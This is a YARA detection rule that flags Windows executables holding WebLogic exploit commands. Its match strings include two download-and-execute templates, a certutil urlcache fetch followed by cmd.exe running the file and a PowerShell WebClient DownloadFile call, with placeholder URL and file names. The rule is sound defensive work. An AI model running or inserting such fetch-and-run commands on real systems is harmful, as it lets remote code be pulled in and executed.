rule INDICATOR_TOOL_EXP_WebLogic
{
	meta:
		author = "ditekSHen"
		description = "Detects Windows executables containing Weblogic exploits commands"
		os = "windows"
		filetype = "executable"

	strings:
		$s1 = "certutil.exe -urlcache -split -f AAAAA BBBBB & cmd.exe /c BBBBB" ascii
		$s2 = "powershell (new-object System.Net.WebClient).DownloadFile('AAAAA','BBBBB')" ascii

	condition:
		uint16(0)==0x5a4d and 1 of them
}
